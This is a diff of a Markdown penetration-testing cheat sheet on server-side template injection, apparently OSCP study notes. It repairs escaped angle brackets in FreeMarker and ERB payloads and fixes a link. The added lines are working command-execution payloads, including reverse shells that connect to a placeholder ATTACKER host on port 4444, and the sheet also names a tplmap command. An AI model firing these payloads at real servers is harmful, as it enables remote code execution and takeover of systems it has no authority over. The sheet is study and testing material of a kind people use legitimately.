@@ -211,20 +211,20 @@ Twig\\\\Error\\\\SyntaxError, reemarker.core.ParseException).
 ```freemarker
 ${7*7}
 ${.data_model}
-%%LT%%#assign ex="freemarker.template.utility.Execute"?new()%%GT%% ${ex("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
 ```
 
 **Command execution:**
 
 ```freemarker
-%%LT%%#assign ex="freemarker.template.utility.Execute"?new()%%GT%% ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
 ${ex("whoami")}
 ```
 
 **Reverse shell:**
 
 ```freemarker
-%%LT%%#assign ex="freemarker.template.utility.Execute"?new()%%GT%% ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("bash -c ''bash -i &> /dev/tcp/ATTACKER/4444 0&>1''")}
 ```
 
 ### 4.4 ERB (Ruby)
@@ -247,7 +247,7 @@ ${ex("whoami")}
 **Reverse shell:**
 
 ```erb
-%%LT%%%= system(''bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"'') %%%GT%%
+<%= system(''bash -c "bash -i &> /dev/tcp/ATTACKER/4444 0&>1"'') %>
 ```
 
 ### 4.5 Other engines
@@ -365,7 +365,7 @@ python2 tplmap.py -u 'http://target/hello?name=INJECT'
 > SSTI to RCE is a strong foothold proof. Show the chain: probe -> engine
 > -> RCE -> shell.
 >
-> See [../../../methodology/OSCP-Reporting.md](../../../methodology/OSCP-Reporting.md).
+> See [../../methodology/OSCP-Reporting.md](../../methodology/OSCP-Reporting.md).
 
 ---
 
